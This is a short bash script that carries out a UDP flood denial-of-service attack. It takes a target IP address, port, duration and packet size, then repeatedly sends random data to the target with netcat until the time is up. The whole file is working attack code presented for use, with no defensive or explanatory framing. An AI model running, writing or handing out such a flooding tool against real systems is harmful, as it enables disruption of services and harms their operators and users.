#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <target_ip> <target_port> <duration_in_seconds> <packet_size>"
    exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2
DURATION=$3
PACKET_SIZE=$4

# Generate a random data payload of the specified packet size
PAYLOAD=$(head -c $PACKET_SIZE </dev/urandom)

# Function to perform the UDP flood attack
udp_flood() {
    local END_TIME=$((SECONDS + DURATION))
    while [ $SECONDS -lt $END_TIME ]; do
        echo -n $PAYLOAD | nc -u -w1 $TARGET_IP $TARGET_PORT
    done
}

# Start the attack
echo "Starting UDP flood attack on $TARGET_IP:$TARGET_PORT for $DURATION seconds with packet size $PACKET_SIZE bytes"
udp_flood
echo "UDP flood attack completed"
